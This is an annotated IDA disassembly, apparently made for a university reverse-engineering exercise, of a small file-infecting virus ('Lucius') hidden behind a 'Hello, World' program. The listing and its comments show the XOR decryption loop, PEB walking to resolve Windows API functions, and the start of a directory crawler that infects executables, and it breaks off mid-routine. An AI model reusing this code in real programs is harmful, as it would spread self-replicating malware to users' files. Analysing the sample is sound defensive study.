.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 16173BBACDA90883EEF90566D4B77F1CA9CAF95CCDF5F561EA4E2CE61EC1B400
.text:00401000 ; Input MD5    : D0D857C46ED4B103C74E4429D07A36F1
.text:00401000 ; Input CRC32  : F5B6D372
.text:00401000
.text:00401000 ; File Name   : /nethome/dtaylor306/lucius/suspiciousUnpacked.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 49C7EA12 (Mon Mar 23 19:59:14 2009)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00000026 (     38.)
.text:00401000 ; Section size in file          : 00000200 (    512.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000 ; Attributes: noreturn
.text:00401000
.text:00401000                 public start
.text:00401000 start           proc near               ; DATA XREF: ExecutableTargetExploit+1B9\u2193o
.text:00401000                 push    0
.text:00401002                 push    offset aHello   ; "Hello"
.text:00401007                 push    offset aHelloWorld ; "Hello, World!"
.text:0040100C                 push    0
.text:0040100E                 call    LuciusStart
.text:00401013                 push    0               ; uExitCode
.text:00401015                 call    ExitProcess
.text:00401015 start           endp
.text:00401015
.text:0040101A ; [00000006 BYTES: COLLAPSED FUNCTION MessageBoxA. PRESS NUMPAD+ TO EXPAND]
.text:00401020 ; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS NUMPAD+ TO EXPAND]
.text:00401026                 align 4
.text:00401028                 db 0
.text:00401029                 db    0
.text:0040102A                 db    0
.text:0040102B                 db    0
.text:0040102C                 db    0
.text:0040102D                 db    0
.text:0040102E                 db    0
.text:0040102F                 db    0
.text:00401030                 db    0
.text:00401031                 db    0
.text:00401032                 db    0
.text:00401033                 db    0
.text:00401034                 db    0
.text:00401035                 db    0
.text:00401036                 db    0
.text:00401037                 db    0
.text:00401038                 db    0
.text:00401039                 db    0
.text:0040103A                 db    0
.text:0040103B                 db    0
.text:0040103C                 db    0
.text:0040103D                 db    0
.text:0040103E                 db    0
.text:0040103F                 db    0
.text:00401040                 db    0
.text:00401041                 db    0
.text:00401042                 db    0
.text:00401043                 db    0
.text:00401044                 db    0
.text:00401045                 db    0
.text:00401046                 db    0
.text:00401047                 db    0
.text:00401048                 db    0
.text:00401049                 db    0
.text:0040104A                 db    0
.text:0040104B                 db    0
.text:0040104C                 db    0
.text:0040104D                 db    0
.text:0040104E                 db    0
.text:0040104F                 db    0
.text:00401050                 db    0
.text:00401051                 db    0
.text:00401052                 db    0
.text:00401053                 db    0
.text:00401054                 db    0
.text:00401055                 db    0
.text:00401056                 db    0
.text:00401057                 db    0
.text:00401058                 db    0
.text:00401059                 db    0
.text:0040105A                 db    0
.text:0040105B                 db    0
.text:0040105C                 db    0
.text:0040105D                 db    0
.text:0040105E                 db    0
.text:0040105F                 db    0
.text:00401060                 db 0
.text:00401061                 dd 0
.text:00401065                 align 200h
.text:00401200                 dd 157h dup(?)
.text:0040175C                 db 3 dup(?)
.text:0040175F                 dd ?
.text:00401763                 dd ?
.text:00401767                 dd ?
.text:0040176B                 dd ?
.text:0040176F                 db ?
.text:00401770                 dd 3 dup(?)
.text:0040177C                 dd ?
.text:00401780                 dd 7 dup(?)
.text:0040179C                 db 3 dup(?)
.text:0040179F                 dd ?
.text:004017A3                 db ?
.text:004017A4                 dd 2 dup(?)
.text:004017AC                 db 2 dup(?)
.text:004017AE                 dd ?
.text:004017B2                 dw ?
.text:004017B4                 dd 2 dup(?)
.text:004017BC                 db ?
.text:004017BD                 dd ?
.text:004017C1                 db 3 dup(?)
.text:004017C4                 dd 3 dup(?)
.text:004017D0                 db 3 dup(?)
.text:004017D3                 dd ?
.text:004017D7                 db ?
.text:004017D8                 dd 3 dup(?)
.text:004017E4                 db ?
.text:004017E5                 dd ?
.text:004017E9                 db 3 dup(?)
.text:004017EC                 dd 4 dup(?)
.text:004017FC                 db ?
.text:004017FD                 dd ?
.text:00401801                 db 3 dup(?)
.text:00401804                 dd 3 dup(?)
.text:00401810                 db 3 dup(?)
.text:00401813                 dd ?
.text:00401817                 db ?
.text:00401818                 dd 4 dup(?)
.text:00401828                 dd ?
.text:0040182C                 dd 2 dup(?)
.text:00401834                 db 3 dup(?)
.text:00401837                 dd ?
.text:0040183B                 db ?
.text:0040183C                 dd 2 dup(?)
.text:00401844                 db 3 dup(?)
.text:00401847                 dd ?
.text:0040184B                 db ?
.text:0040184C                 dd 2 dup(?)
.text:00401854                 db ?
.text:00401855                 dd ?
.text:00401859                 db 3 dup(?)
.text:0040185C                 dd 2 dup(?)
.text:00401864                 db 2 dup(?)
.text:00401866                 dd ?
.text:0040186A                 dw ?
.text:0040186C                 dd 3 dup(?)
.text:00401878                 db 2 dup(?)
.text:0040187A                 dd ?
.text:0040187E                 dw ?
.text:00401880                 dd 2 dup(?)
.text:00401888                 db 2 dup(?)
.text:0040188A                 dd ?
.text:0040188E                 dw ?
.text:00401890                 dd 2 dup(?)
.text:00401898                 db 3 dup(?)
.text:0040189B                 dd ?
.text:0040189F                 db ?
.text:004018A0                 dd 2 dup(?)
.text:004018A8                 db 3 dup(?)
.text:004018AB                 dd ?
.text:004018AF                 db ?
.text:004018B0                 dd 3 dup(?)
.text:004018BC                 db ?
.text:004018BD                 dd ?
.text:004018C1                 db 3 dup(?)
.text:004018C4                 dd 3 dup(?)
.text:004018D0                 db 3 dup(?)
.text:004018D3                 dd ?
.text:004018D7                 db ?
.text:004018D8                 dd 3 dup(?)
.text:004018E4                 dd ?
.text:004018E8                 dd 2 dup(?)
.text:004018F0                 db 2 dup(?)
.text:004018F2                 dd ?
.text:004018F6                 dw ?
.text:004018F8                 dd 0ACh dup(?)
.text:00401BA8                 db ?
.text:00401BA9                 dd ?
.text:00401BAD                 dd ?
.text:00401BB1                 dd ?
.text:00401BB5                 dd ?
.text:00401BB9                 dd ?
.text:00401BBD                 db 3 dup(?)
.text:00401BC0                 db ?
.text:00401BC1                 dd ?
.text:00401BC5                 dd ?
.text:00401BC9                 dd ?
.text:00401BCD                 dd ?
.text:00401BD1                 dd ?
.text:00401BD5                 dd ?
.text:00401BD9                 dd ?
.text:00401BDD                 dd ?
.text:00401BE1                 db 3 dup(?)
.text:00401BE4                 db ?
.text:00401BE5                 dd ?
.text:00401BE9                 db 3 dup(?)
.text:00401BEC                 db ?
.text:00401BED                 db 3 dup(?)
.text:00401BF0                 db ?
.text:00401BF1                 db 3 dup(?)
.text:00401BF4                 dd 5 dup(?)
.text:00401C08                 dd ?
.text:00401C0C                 dd ?
.text:00401C10                 dd ?
.text:00401C14                 dd 0FBh dup(?)
.text:00401C14 _text           ends
.text:00401C14
.idata:00402000 ; Section 2. (virtual address 00002000)
.idata:00402000 ; Virtual size                  : 00000092 (    146.)
.idata:00402000 ; Section size in file          : 00000200 (    512.)
.idata:00402000 ; Offset to raw data for section: 00000600
.idata:00402000 ; Flags 40000040: Data Readable
.idata:00402000 ; Alignment     : default
.idata:00402000 ;
.idata:00402000 ; Imports from kernel32.dll
.idata:00402000 ;
.idata:00402000 ; ===========================================================================
.idata:00402000
.idata:00402000 ; Segment type: Externs
.idata:00402000 ; _idata
.idata:00402000 ; void __stdcall __noreturn ExitProcess(UINT uExitCode)
.idata:00402000                 extrn __imp_ExitProcess:dword
.idata:00402000                                         ; DATA XREF: ExitProcess\u2191r
.idata:00402000                                         ; .rdata:00402034\u2193o
.idata:00402004
.idata:00402008 ;
.idata:00402008 ; Imports from user32.dll
.idata:00402008 ;
.idata:00402008 ; int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:00402008                 extrn __imp_MessageBoxA:dword
.idata:00402008                                         ; DATA XREF: MessageBoxA\u2191r
.idata:00402008                                         ; .rdata:00402020\u2193o
.idata:0040200C
.idata:0040200C
.rdata:00402010 ; ===========================================================================
.rdata:00402010
.rdata:00402010 ; Segment type: Pure data
.rdata:00402010 ; Segment permissions: Read
.rdata:00402010 _rdata          segment para public 'DATA' use32
.rdata:00402010                 assume cs:_rdata
.rdata:00402010                 ;org 402010h
.rdata:00402010 __IMPORT_DESCRIPTOR_user32 dd rva off_402054 ; Import Name Table
.rdata:00402014                 dd 0                    ; Time stamp
.rdata:00402018                 dd 0                    ; Forwarder Chain
.rdata:0040201C                 dd rva aUser32Dll       ; DLL Name
.rdata:00402020                 dd rva __imp_MessageBoxA ; Import Address Table
.rdata:00402024 __IMPORT_DESCRIPTOR_kernel32 dd rva off_40204C ; Import Name Table
.rdata:00402028                 dd 0                    ; Time stamp
.rdata:0040202C                 dd 0                    ; Forwarder Chain
.rdata:00402030                 dd rva aKernel32Dll     ; DLL Name
.rdata:00402034                 dd rva __imp_ExitProcess ; Import Address Table
.rdata:00402038                 db    0
.rdata:00402039                 db    0
.rdata:0040203A                 db    0
.rdata:0040203B                 db    0
.rdata:0040203C                 db    0
.rdata:0040203D                 db    0
.rdata:0040203E                 db    0
.rdata:0040203F                 db    0
.rdata:00402040                 db    0
.rdata:00402041                 db    0
.rdata:00402042                 db    0
.rdata:00402043                 db    0
.rdata:00402044                 db    0
.rdata:00402045                 db    0
.rdata:00402046                 db    0
.rdata:00402047                 db    0
.rdata:00402048                 db    0
.rdata:00402049                 db    0
.rdata:0040204A                 db    0
.rdata:0040204B                 db    0
.rdata:0040204C ;
.rdata:0040204C ; Import names for kernel32.dll
.rdata:0040204C ;
.rdata:0040204C off_40204C      dd rva word_402076      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_kernel32\u2191o
.rdata:00402050                 dd 0
.rdata:00402054 ;
.rdata:00402054 ; Import names for user32.dll
.rdata:00402054 ;
.rdata:00402054 off_402054      dd rva word_40205C      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_user32\u2191o
.rdata:00402058                 dd 0
.rdata:0040205C word_40205C     dw 1B1h                 ; DATA XREF: .rdata:off_402054\u2191o
.rdata:0040205E                 db 'MessageBoxA',0
.rdata:0040206A aUser32Dll      db 'user32.dll',0       ; DATA XREF: .rdata:0040201C\u2191o
.rdata:00402075                 align 2
.rdata:00402076 word_402076     dw 9Bh                  ; DATA XREF: .rdata:off_40204C\u2191o
.rdata:00402078                 db 'ExitProcess',0
.rdata:00402084 aKernel32Dll    db 'kernel32.dll',0     ; DATA XREF: .rdata:00402030\u2191o
.rdata:00402091                 align 1000h
.rdata:00402091 _rdata          ends
.rdata:00402091
.data:00403000 ; Section 3. (virtual address 00003000)
.data:00403000 ; Virtual size                  : 00000CAA (   3242.)
.data:00403000 ; Section size in file          : 00000E9D (   3741.)
.data:00403000 ; Offset to raw data for section: 00000800
.data:00403000 ; Flags C0000040: Data Readable Writable
.data:00403000 ; Alignment     : default
.data:00403000 ; ===========================================================================
.data:00403000
.data:00403000 ; Segment type: Pure data
.data:00403000 ; Segment permissions: Read/Write
.data:00403000 _data           segment para public 'DATA' use32
.data:00403000                 assume cs:_data
.data:00403000                 ;org 403000h
.data:00403000 aHelloWorld     db 'Hello, World!',0    ; DATA XREF: start+7\u2191o
.data:0040300E aHello          db 'Hello',0            ; DATA XREF: start+2\u2191o
.data:00403014
.data:00403014 ; =============== S U B R O U T I N E =======================================
.data:00403014
.data:00403014
.data:00403014 LuciusStart     proc near               ; CODE XREF: start+E\u2191p
.data:00403014
.data:00403014 ; FUNCTION CHUNK AT .data:004032EB SIZE 00000027 BYTES
.data:00403014 ; FUNCTION CHUNK AT .data:00403C28 SIZE 00000053 BYTES
.data:00403014 ; FUNCTION CHUNK AT .data:00403CAA SIZE 00000006 BYTES
.data:00403014
.data:00403014 ebp2014 = ebp
.data:00403014                 call    $+5             ; stores the eip (403019h) of the next instruction on the stack
.data:00403019                 pop     ebp2014         ; pops the eip of this instruction into ebp (ebp = 403019h)
.data:0040301A                 sub     ebp2014, 401005h ; subtracts 401005h from ebp (ebp = 403019 - 401014h = 2014h)
.data:00403020                 cmp     dword ptr [ebp2014+401061h], 0 ; checks if data at (2014h + 401061h = 403075h) is null
.data:00403027                 jnz     short unpackSetup ; goes through with unpacking process
.data:00403029                 jmp     short moduleSearchSetup ; jumps to the module searching
.data:0040302B ; ---------------------------------------------------------------------------
.data:0040302B
.data:0040302B unpackSetup:                            ; CODE XREF: LuciusStart+13\u2191j
.data:0040302B                 mov     ecx, 0C31h      ; sets the count register which is decremented with each 'loop' execution. meaning that C31h bytes will be unpacked
.data:00403030                 lea     esi, [ebp2014+401065h] ; loads the address of 403079h into the source register which is the start of the unpacking targets
.data:00403036                 mov     edi, esi        ; sets the destination register meaning the packed byte will be unpacked and stored at the same location
.data:00403038
.data:00403038 unpackLoop:                             ; CODE XREF: LuciusStart+5D\u2193j
.data:00403038                 lodsb                   ; loads in byte pointed at by esi and increments the esi pointer
.data:00403039                 push    eax             ; pushes the value of the loaded byte onto the stack
.data:0040303A                 push    ecx             ; pushes count value for restoration later
.data:0040303B                 mov     eax, [ebp2014+401061h] ; loads word at 403075h into eax which seems like some carryover from previous iterations
.data:00403041                 xor     edx, edx        ; set edx to 0 which seems like a formality since the div command will set edx to the remainder
.data:00403043                 mov     ecx, 1F31Dh     ; value to divide eax by
.data:00403048                 div     ecx             ; divides eax by ecx and stores the value into eax
.data:0040304A                 mov     ecx, eax        ; moves that quotient into ecx
.data:0040304C                 mov     eax, 41A7h      ; another hard coded value stored into eax
.data:00403051                 mul     edx             ; multiplies eax by edx where edx is the remainder from the last divide
.data:00403053                 mov     edx, ecx        ; moves the quotient from the first division into edx
.data:00403055                 mov     ecx, eax        ; moves the product of the multiplication into ecx
.data:00403057                 mov     eax, 0B14h      ; moves another hard coded value into eax
.data:0040305C                 mul     edx             ; multiplies this value by the quotient of the original division
.data:0040305E                 sub     ecx, eax        ; subtracts this product from the original quotient
.data:00403060                 xor     edx, edx        ; reset edx to zero
.data:00403062                 mov     eax, ecx        ; moves the difference from the subtraction into eax
.data:00403064                 mov     [ebp2014+401061h], ecx ; stores that difference into the carryover value in memory
.data:0040306A                 mov     edx, eax        ; moves the difference into edx
.data:0040306C                 pop     ecx             ; restores ecx to the count value for the loop
.data:0040306D                 pop     eax             ; restores eax to the byte that was loaded originally
.data:0040306E                 xor     al, dl          ; xor the original byte to the unpacked byte
.data:00403070                 stosb                   ; store the result of that xor into the same location the byte was pulled from
.data:00403071                 loop    unpackLoop      ; repeat this process until ecx reaches 0 with ecx being decremented before the loop checks
.data:00403073                 jmp     short moduleSearchSetup ; The malware is now unpacked
.data:00403073                                         ; the previous loop read through ~3079 up to ~3CAA and unpacked it to the intended code
.data:00403073                                         ; we got this range from the ecx counter used with loop which was initialized to C31
.data:00403073                                         ; everything past this needs to be reverse engineered to determine the malware's purpose
.data:00403073                                         ; execution reached this point because a call to messageBox was overwritten with the memory location of
.data:00403073                                         ; .data just after the "Hello World" string
.data:00403073 ; ---------------------------------------------------------------------------
.data:00403075                 dd 3C109237h            ; carryover value for the unpacking process
.data:00403079 ; ---------------------------------------------------------------------------
.data:00403079
.data:00403079 moduleSearchSetup:                      ; CODE XREF: LuciusStart+15\u2191j
.data:00403079                                         ; LuciusStart+5F\u2191j
.data:00403079                 push    esi             ; module search expects esi to be in stack at the start of each loop
.data:0040307A                 xor     eax, eax        ; zeros out eax
.data:0040307C                 mov     eax, fs:[eax+30h] ; FS points to the thread information block at start of execution
.data:0040307C                                         ; the wiki shows that 0x30 offset is the linear address of Process Environment Block
.data:00403080                 test    eax, eax        ; test does a bitwise and of the arguments and changes the flags as necessary
.data:00403082                 js      short basePointerSetup ; jumps if signed indicating which of the library structures needs to be traversed
.data:00403084                 mov     eax, [eax+0Ch]  ; grabs the ldr data pointer of the PEB
.data:00403087                 mov     esi, [eax+1Ch]  ; grabs the pointer to the first PEB entry in init order
.data:00403087                                         ; ntdll is always the first library when ordered this way
.data:00403087                                         ; eax now has a pointer to the start of that struct
.data:0040308A                 lodsd                   ; the entry is a linked list item with a forward and backward link
.data:0040308A                                         ; the first item is the front link which esi already points to
.data:0040308A                                         ; this lodsd brings in the front link location into eax
.data:0040308B                 mov     eax, [eax+8]    ; stores module base into eax
.data:0040308E                 jmp     short moduleSearchParent
.data:00403090 ; ---------------------------------------------------------------------------
.data:00403090
.data:00403090 basePointerSetup:                       ; CODE XREF: LuciusStart+6E\u2191j
.data:00403090                 mov     eax, [eax+34h]  ; grabs library list pointer
.data:00403093                 lea     eax, [eax+7Ch]  ; moves pointer up 7Ch bytes
.data:00403096                 mov     eax, [eax+3Ch]  ; this gives the base for the libraries that lucius will be looking up
.data:00403099                                         ; many of the operations in this block are repeated. the high level view of the algorithm is:
.data:00403099                                         ; set eax to the library base
.data:00403099                                         ; point esi to the string name of the desired function
.data:00403099                                         ; call the SearchModule
.data:00403099                                         ; move the result from eax into memory for later
.data:00403099                                         ; repeat
.data:00403099                                         ; the malware uses these results later to access the desired functions by directly calling the pointers
.data:00403099
.data:00403099 moduleSearchParent:                     ; CODE XREF: LuciusStart+7A\u2191j
.data:00403099                 pop     esi             ; restores esi
.data:0040309A                 mov     [ebp2014+401BB9h], eax ; stores the library base in memory for later
.data:004030A0                 lea     esi, [ebp2014+401770h] ; "LoadLibrary" string
.data:004030A6                 call    searchModule    ; returns the pointer to the desired function
.data:004030AB                 mov     [ebp2014+40177Ch], eax
.data:004030B1                 mov     eax, [ebp2014+401BB9h] ; restores the base into eax
.data:004030B7                 lea     esi, [ebp2014+401801h] ; "GetCurrentProcess" string
.data:004030BD                 call    searchModule    ; returns a pointer to the desired function
.data:004030C2                 mov     [ebp2014+401813h], eax
.data:004030C8                 mov     eax, [ebp2014+401BB9h] ; restores the base into eax
.data:004030CE                 lea     esi, [ebp2014+401817h] ; "SetPriorityClass" string
.data:004030D4                 call    searchModule
.data:004030D9                 mov     [ebp2014+401828h], eax
.data:004030DF                 mov     eax, [ebp2014+401BB9h] ; restores the base into eax
.data:004030E5                 lea     esi, [ebp2014+4018AFh] ; "FindFirstFile" string
.data:004030EB                 call    searchModule
.data:004030F0                 mov     [ebp2014+4018BDh], eax
.data:004030F6                 mov     eax, [ebp2014+401BB9h]
.data:004030FC                 lea     esi, [ebp2014+4017E9h] ; "SetCurrentDirectory" string
.data:00403102                 call    searchModule
.data:00403107                 mov     [ebp2014+4017FDh], eax
.data:0040310D                 mov     eax, [ebp2014+401BB9h]
.data:00403113                 lea     esi, [ebp2014+4018C1h] ; "GetFileAttributes" string
.data:00403119                 call    searchModule
.data:0040311E                 mov     [ebp2014+4018D3h], eax
.data:00403124                 mov     eax, [ebp2014+401BB9h]
.data:0040312A                 lea     esi, [ebp2014+4018D7h] ; "FindNextFile" string
.data:00403130                 call    searchModule
.data:00403135                 mov     [ebp2014+4018E4h], eax
.data:0040313B                 mov     eax, [ebp2014+401BB9h]
.data:00403141                 lea     esi, [ebp2014+4018E8h] ; "FindClose" string
.data:00403147                 call    searchModule
.data:0040314C                 mov     [ebp2014+4018F2h], eax
.data:00403152                 mov     eax, [ebp2014+401BB9h]
.data:00403158                 lea     esi, [ebp2014+401793h] ; "GlobalAlloc" string
.data:0040315E                 call    searchModule
.data:00403163                 mov     [ebp2014+40179Fh], eax
.data:00403169                 mov     eax, [ebp2014+401BB9h]
.data:0040316F                 lea     esi, [ebp2014+4017A3h] ; "GlobalFree" string
.data:00403175                 call    searchModule
.data:0040317A                 mov     [ebp2014+4017AEh], eax
.data:00403180                 mov     eax, [ebp2014+401BB9h]
.data:00403186                 lea     esi, [ebp2014+4017B2h] ; "CreateFile" string
.data:0040318C                 call    searchModule
.data:00403191                 mov     [ebp2014+4017BDh], eax
.data:00403197                 mov     eax, [ebp2014+401BB9h]
.data:0040319D                 lea     esi, [ebp2014+40188Eh] ; "GetTickCount" string
.data:004031A3                 call    searchModule
.data:004031A8                 mov     [ebp2014+40189Bh], eax
.data:004031AE                 mov     eax, [ebp2014+401BB9h]
.data:004031B4                 lea     esi, [ebp2014+40183Bh] ; "CreateMutex" string
.data:004031BA                 call    searchModule
.data:004031BF                 mov     [ebp2014+401847h], eax
.data:004031C5                 mov     eax, [ebp2014+401BB9h]
.data:004031CB                 lea     esi, [ebp2014+40184Bh] ; "OpenMutex" string
.data:004031D1                 call    searchModule
.data:004031D6                 mov     [ebp2014+401855h], eax
.data:004031DC                 mov     eax, [ebp2014+401BB9h]
.data:004031E2                 lea     esi, [ebp2014+401859h] ; "ReleaseMutex" string
.data:004031E8                 call    searchModule
.data:004031ED                 mov     [ebp2014+401866h], eax
.data:004031F3                 mov     eax, [ebp2014+401BB9h]
.data:004031F9                 lea     esi, [ebp2014+40189Fh] ; "GetFileSize" string
.data:004031FF                 call    searchModule
.data:00403204                 mov     [ebp2014+4018ABh], eax
.data:0040320A                 mov     eax, [ebp2014+401BB9h]
.data:00403210                 lea     esi, [ebp2014+4017C1h] ; "CreateFileMapping" string
.data:00403216                 call    searchModule
.data:0040321B                 mov     [ebp2014+4017D3h], eax
.data:00403221                 mov     eax, [ebp2014+401BB9h]
.data:00403227                 lea     esi, [ebp2014+4017D7h] ; "MapViewOfFile" string
.data:0040322D                 call    searchModule
.data:00403232                 mov     [ebp2014+4017E5h], eax
.data:00403238                 mov     eax, [ebp2014+401BB9h]
.data:0040323E                 lea     esi, [ebp2014+40186Ah] ; "UnmapViewOfFile" string
.data:00403244                 call    searchModule
.data:00403249                 mov     [ebp2014+40187Ah], eax
.data:0040324F                 mov     eax, [ebp2014+401BB9h]
.data:00403255                 lea     esi, [ebp2014+40187Eh] ; "CloseHandle" string
.data:0040325B                 call    searchModule
.data:00403260                 mov     [ebp2014+40188Ah], eax
.data:00403266                 jmp     changeDirAndTick
.data:00403266 LuciusStart     endp
.data:00403266
.data:0040326B
.data:0040326B ; =============== S U B R O U T I N E =======================================
.data:0040326B
.data:0040326B
.data:0040326B searchModule    proc near               ; CODE XREF: LuciusStart+92\u2191p
.data:0040326B                                         ; LuciusStart+A9\u2191p ...
.data:0040326B                 mov     ebx, [eax+3Ch]
.data:0040326E                 add     ebx, eax
.data:00403270                 add     ebx, 78h ; 'x'
.data:00403273                 mov     ebx, [ebx]
.data:00403275                 add     ebx, eax
.data:00403277                 xor     edx, edx
.data:00403279                 mov     ecx, [ebx+20h]
.data:0040327C                 add     ecx, eax
.data:0040327E                 push    esi
.data:0040327F                 push    edx
.data:00403280
.data:00403280 nextModuleCandidate:                    ; CODE XREF: searchModule+27\u2193j
.data:00403280                 pop     edx             ; edx holds the number of attempted modules until the correct one is found
.data:00403281                 pop     esi             ; esi holds the pointer to the search string
.data:00403282                 inc     edx             ; increments the edx after each failure
.data:00403282                                         ; the count starts at 1 as this in is reached before the first search has a chance to run
.data:00403283                 mov     edi, [ecx]      ; moves this module's offset into edi
.data:00403285                 add     edi, eax        ; adds the base address for the modules onto the offset giving a pointer to the string name of the module
.data:00403287                 add     ecx, 4          ; increments ecx in preparation for the next module name should this one fail
.data:0040328A                 push    esi             ; preserves the esi that points to the search string
.data:0040328B                 push    edx             ; preserves the counter wrong module counter edx
.data:0040328C
.data:0040328C compareCharacters:                      ; CODE XREF: searchModule+30\u2193j
.data:0040328C                 mov     dl, [edi]       ; grabs character of candidate module string that is at cursor
.data:0040328E                 mov     dh, [esi]       ; grabs character at desired module string's cursor
.data:00403290                 cmp     dl, dh          ; checks if the two characters are the same
.data:00403292                 jnz     short nextModuleCandidate ; if these characters don't match, this is the wrong module
.data:00403294                 inc     edi             ; if the characters do match, move the cursors up a character
.data:00403295                 inc     esi             ; again but this time move the target string cursor
.data:00403296                 cmp     byte ptr [esi], 0 ; check if the target string cursor has reached the string's null terminator
.data:00403299                 jz      short correctModuleFound ; if it has then the candidate module's name completely matches at least what the search string offers
.data:00403299                                         ; (it is likely longer though)
.data:0040329B                 jmp     short compareCharacters ; repeat comparing characters until one is wrong or we reach the string terminator
.data:0040329D ; ---------------------------------------------------------------------------
.data:0040329D
.data:0040329D correctModuleFound:                     ; CODE XREF: searchModule+2E\u2191j
.data:0040329D                 pop     edx             ; restore wrong module counter
.data:0040329E                 pop     esi             ; restore target string pointer
.data:0040329F                 dec     edx             ; decrement wrong module counter (it started at 1 so this accounts for that)
.data:004032A0                 shl     edx, 1
.data:004032A2                 mov     ecx, [ebx+24h]
.data:004032A5                 add     ecx, eax
.data:004032A7                 add     ecx, edx
.data:004032A9                 xor     edx, edx
.data:004032AB                 mov     dx, [ecx]
.data:004032AE                 shl     edx, 2
.data:004032B1                 mov     ecx, [ebx+1Ch]
.data:004032B4                 add     ecx, eax
.data:004032B6                 add     ecx, edx
.data:004032B8                 add     eax, [ecx]
.data:004032BA                 retn                    ; eax now contains the pointer to the desired
.data:004032BA searchModule    endp                    ; function
.data:004032BA
.data:004032BB
.data:004032BB ; =============== S U B R O U T I N E =======================================
.data:004032BB
.data:004032BB
.data:004032BB pseudoRando     proc near               ; CODE XREF: ExecutableTargetExploit:repeatUntil11Divisible\u2193p
.data:004032BB                 mov     eax, [ebp+401BE5h] ; grabs the pseudo random number from
.data:004032BB                                         ; GetTickCount
.data:004032C1 the following lines are another random number
.data:004032C1 generator. the results of this is not really meant to
.data:004032C1 fulfill a purpose other than padding so I won't go too in
.data:004032C1 depth
.data:004032C1                 xor     edx, edx
.data:004032C3                 mov     ecx, 1F31Dh
.data:004032C8                 div     ecx
.data:004032CA                 mov     ecx, eax
.data:004032CC                 mov     eax, 41A7h
.data:004032D1                 mul     edx
.data:004032D3                 mov     edx, ecx
.data:004032D5                 mov     ecx, eax
.data:004032D7                 mov     eax, 0B14h
.data:004032DC                 mul     edx
.data:004032DE                 sub     ecx, eax
.data:004032E0                 xor     edx, edx
.data:004032E2                 mov     eax, ecx        ; result is saved to eax as return value
.data:004032E4                 mov     [ebp+401BE5h], ecx ; results are stored as next seed, next seed | eax = 41A7h * (seed%1F31h) - (seed / 1f31h)*(B14h)
.data:004032EA                 retn
.data:004032EA pseudoRando     endp
.data:004032EA
.data:004032EB ; ---------------------------------------------------------------------------
.data:004032EB ; START OF FUNCTION CHUNK FOR LuciusStart
.data:004032EB
.data:004032EB changeDirAndTick:                       ; CODE XREF: LuciusStart+252\u2191j
.data:004032EB                 mov     eax, [ebp+40189Bh] ; GetTickCount's call address is loaded into eax
.data:004032F1                 call    eax             ; getTickCount is called
.data:004032F3                 mov     [ebp+401BE5h], eax ; result of GetTickCount is stored into memory for later
.data:004032F3                                         ; it will be used as a seed to encrypt copies of this malware in another executable
.data:004032F9                 lea     esi, [ebp+401BF4h] ; loads the string "danger"
.data:004032FF                 push    esi             ; pushes that string pointer onto the stack as an input to the next call
.data:00403300                 mov     eax, [ebp+4017FDh] ; moves pointer to the function "SetCurrentDirectory"
.data:00403306                 call    eax             ; calls SetCurrentDirectory
.data:00403306                                         ; The current directory is now whatever the process was run in before with a /danger tacked to the end
.data:00403308                 call    RecursiveDirectoryCrawler ; this is where all the infection logic is and the attack surface is defined
.data:00403308                                         ; it starts at a predefined directory, and infects all exe's it finds there
.data:00403308                                         ; any directory it comes across is entered and the process is repeated there
.data:00403308                                         ; this version of the malware was gimped and it starts in a ./danger directory
.data:00403308                                         ; this malware was probably was meant to start in some sort of root directory
.data:00403308                                         ; or a more common one that this process had permission to edit
.data:0040330D                 jmp     PreHandoff      ; here is the exit logic where control is
.data:0040330D ; END OF FUNCTION CHUNK FOR LuciusStart ; returned to the host
.data:0040330D ; ---------------------------------------------------------------------------
.data:00403312                 db '��'
.data:00403314                 db  13h
.data:00403315                 db  18h
.data:00403316                 db '@',0
.data:00403318 aYd             db '�Ћ\$'
.data:0040331D                 db    4
.data:0040331E aSp             db 'SP��('
.data:00403323                 db  18h
.data:00403324                 db '@',0
.data:00403326                 db 0FFh ; �
.data:00403327                 db 0D0h ; �
.data:00403328                 db 0C3h ; �
.data:00403329
.data:00403329 ; =============== S U B R O U T I N E =======================================
.data:00403329
.data:00403329
.data:00403329 CharacterScanSetup proc near            ; CODE XREF: RecursiveDirectoryCrawler+BF\u2193p
.data:00403329                 mov     esi, ecx        ; moves the pointer to the file name into esi
.data:0040332B
.data:0040332B CharacterScan:                          ; CODE XREF: CharacterScanSetup:restartCharacterScan\u2193j
.data:0040332B                 lodsb                   ; load the first character into eax and increments esi
.data:0040332C                 or      al, al          ; or the al register to update flags
.data:0040332E                 jnz     short checkForExtension ; jump if the character is nonzero (not a string terminator)
.data:00403330                 mov     eax, 0FFFFFFFFh ; otherwise set error value
.data:00403335                 jmp     short JustAReturn ; jump to return
.data:00403335 ; ---------------------------------------------------------------------------
.data:00403337                 db 0EBh ; �
.data:00403338                 db    6
.data:00403339 ; ---------------------------------------------------------------------------
.data:00403339
.data:00403339 checkForExtension:                      ; CODE XREF: CharacterScanSetup+5\u2191j
.data:00403339                 cmp     al, 2Eh ; '.'   ; compare the character to a "."
